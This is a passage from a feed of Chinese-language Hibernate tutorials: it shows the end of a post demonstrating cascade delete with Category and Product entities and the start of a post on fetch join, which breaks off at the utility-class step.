    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> Set&lt;Product&gt; <span class="hljs-title function_">getProducts</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> products;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProducts</span><span class="hljs-params">(Set&lt;Product&gt; products)</span> {
        <span class="hljs-built_in">this</span>.products = products;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addProduct</span><span class="hljs-params">(Product product)</span> {
        products.add(product);
        product.setCategory(<span class="hljs-built_in">this</span>);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeProduct</span><span class="hljs-params">(Product product)</span> {
        products.remove(product);
        product.setCategory(<span class="hljs-literal">null</span>);
    }
}
</code></pre>
<h5 data-id="heading-3"><code>Product</code>实体类</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-meta">@ManyToOne</span>
    <span class="hljs-meta">@JoinColumn(name = "category_id")</span>
    <span class="hljs-keyword">private</span> Category category;

    <span class="hljs-comment">// Getters 和 Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> Double <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> price;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrice</span><span class="hljs-params">(Double price)</span> {
        <span class="hljs-built_in">this</span>.price = price;
    }

    <span class="hljs-keyword">public</span> Category <span class="hljs-title function_">getCategory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> category;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCategory</span><span class="hljs-params">(Category category)</span> {
        <span class="hljs-built_in">this</span>.category = category;
    }
}
</code></pre>
<h4 data-id="heading-4">步骤二：配置Hibernate</h4>
<p>我们需要一个配置文件来配置Hibernate连接和映射。</p>
<h5 data-id="heading-5">Hibernate配置文件 <code>hibernate.cfg.xml</code></h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 数据库连接配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate 属性配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 映射类 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Category"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-6">步骤三：实用类HibernateUtil</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h4 data-id="heading-7">步骤四：实现级联删除</h4>
<p>我们可以编写一个方法来演示级联删除的效果。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> com.example.domain.Category;
<span class="hljs-keyword">import</span> com.example.domain.Product;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateCascadeDeleteExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 获取SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// 插入示例数据</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// 测试级联删除</span>
        testCascadeDelete(sessionFactory);

        <span class="hljs-comment">// 关闭SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Category</span> <span class="hljs-variable">category</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Category</span>();
            category.setName(<span class="hljs-string">"Electronics"</span>);

            <span class="hljs-type">Product</span> <span class="hljs-variable">product1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
            product1.setName(<span class="hljs-string">"Laptop"</span>);
            product1.setPrice(<span class="hljs-number">1000.0</span>);

            <span class="hljs-type">Product</span> <span class="hljs-variable">product2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
            product2.setName(<span class="hljs-string">"Smartphone"</span>);
            product2.setPrice(<span class="hljs-number">500.0</span>);

            category.addProduct(product1);
            category.addProduct(product2);

            session.save(category);

            transaction.commit();
            System.out.println(<span class="hljs-string">"Inserted sample data"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testCascadeDelete</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 获取Category</span>
            <span class="hljs-type">Category</span> <span class="hljs-variable">category</span> <span class="hljs-operator">=</span> session.get(Category.class, <span class="hljs-number">1L</span>);
            <span class="hljs-keyword">if</span> (category != <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// 删除Category</span>
                session.delete(category);
                transaction.commit();
                System.out.println(<span class="hljs-string">"Category and associated Products deleted"</span>);
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-8">详细解释</h3>
<ol>
<li>
<p><strong>定义实体类</strong>：</p>
<ul>
<li><code>Category</code>类与<code>Product</code>类是一对多关系，<code>Category</code>可以有多个<code>Product</code>。</li>
<li>在<code>Category</code>类中，<code>@OneToMany</code>注解用于定义与<code>Product</code>的关联关系，并且通过<code>cascade = CascadeType.ALL</code>指定所有操作（包括删除）都进行级联处理。同时，<code>orphanRemoval = true</code>确保孤儿对象（即不再被引用的子对象）也会被删除。</li>
<li><code>Product</code>类中的<code>@ManyToOne</code>注解用于定义与<code>Category</code>的多对一关系。</li>
</ul>
</li>
<li>
<p><strong>配置文件</strong>：</p>
<ul>
<li><code>hibernate.cfg.xml</code>配置文件用于设置数据库连接、Hibernate属性和映射类。</li>
</ul>
</li>
<li>
<p><strong>实用类HibernateUtil</strong>：</p>
<ul>
<li><code>HibernateUtil</code>类提供了获取<code>SessionFactory</code>实例的方法。</li>
</ul>
</li>
<li>
<p><strong>实现级联删除</strong>：</p>
<ul>
<li>在<code>insertSampleData</code>方法中，创建并保存一个<code>Category</code>和两个关联的<code>Product</code>。</li>
<li>在<code>testCascadeDelete</code>方法中，获取一个<code>Category</code>对象并将其删除。由于配置了级联删除，相关联的<code>Product</code>对象也会被自动删除。</li>
</ul>
</li>
</ol>
<p>通过这种方式，可以轻松实现Hibernate中的级联删除功能，以确保在删除主实体时自动删除关联的子实体，从而保持数据的一致性和完整性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（44）Hibernate中的fetch join是什么？]]></title>    <link>https://juejin.cn/post/7595150851477831723</link>    <guid>https://juejin.cn/post/7595150851477831723</guid>    <pubDate>2026-01-15T11:47:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595150851477831723" data-draft-id="7595178023256915987" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（44）Hibernate中的fetch join是什么？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-15T11:47:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（44）Hibernate中的fetch join是什么？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T11:47:00.000Z" title="Thu Jan 15 2026 11:47:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在Hibernate中，<code>fetch join</code>是一种通过单个查询同时加载相关实体的方法。这种方式可避免N+1查询问题，提高数据访问效率。<code>fetch join</code>通常用于解决延迟加载带来的性能问题。</p>
<h3 data-id="heading-0">Fetch Join示例</h3>
<p>假设我们有两个实体类：<code>Category</code>和<code>Product</code>，它们之间是一对多的关系。我们将演示如何使用<code>fetch join</code>在查询<code>Category</code>时，同时加载其关联的<code>Product</code>。</p>
<h4 data-id="heading-1">步骤一：定义实体类</h4>
<h5 data-id="heading-2"><code>Category</code>实体类</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.Set;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "category")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Category</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@OneToMany(mappedBy = "category", fetch = FetchType.LAZY, cascade = CascadeType.ALL)</span>
    <span class="hljs-keyword">private</span> Set&lt;Product&gt; products = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();

    <span class="hljs-comment">// Getters 和 Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> Set&lt;Product&gt; <span class="hljs-title function_">getProducts</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> products;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProducts</span><span class="hljs-params">(Set&lt;Product&gt; products)</span> {
        <span class="hljs-built_in">this</span>.products = products;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addProduct</span><span class="hljs-params">(Product product)</span> {
        products.add(product);
        product.setCategory(<span class="hljs-built_in">this</span>);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeProduct</span><span class="hljs-params">(Product product)</span> {
        products.remove(product);
        product.setCategory(<span class="hljs-literal">null</span>);
    }
}
</code></pre>
<h5 data-id="heading-3"><code>Product</code>实体类</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-meta">@ManyToOne</span>
    <span class="hljs-meta">@JoinColumn(name = "category_id")</span>
    <span class="hljs-keyword">private</span> Category category;

    <span class="hljs-comment">// Getters 和 Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> Double <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> price;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrice</span><span class="hljs-params">(Double price)</span> {
        <span class="hljs-built_in">this</span>.price = price;
    }

    <span class="hljs-keyword">public</span> Category <span class="hljs-title function_">getCategory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> category;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCategory</span><span class="hljs-params">(Category category)</span> {
        <span class="hljs-built_in">this</span>.category = category;
    }
}
</code></pre>
<h4 data-id="heading-4">步骤二：配置Hibernate</h4>
<p>我们需要一个配置文件来配置Hibernate连接和映射。</p>
<h5 data-id="heading-5">Hibernate配置文件 <code>hibernate.cfg.xml</code></h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 数据库连接配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate 属性配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 映射类 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Category"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-6">步骤三：实用类HibernateUtil</h4>
